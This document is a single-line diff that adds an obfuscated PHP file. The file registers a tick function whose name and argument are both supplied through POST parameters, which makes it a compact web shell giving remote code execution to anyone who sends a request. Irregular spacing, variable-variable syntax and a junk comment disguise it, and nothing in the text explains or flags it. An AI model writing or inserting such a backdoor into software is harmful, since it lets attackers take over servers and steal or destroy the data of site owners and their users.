@@ -1,0 +1,1 @@
+<?php declare (ticks=1);@register_tick_function( $ {"_POST"}/*ql0r9k4ksm*/{ "S9"} ,${ "_POST"} {     "NF"}     );
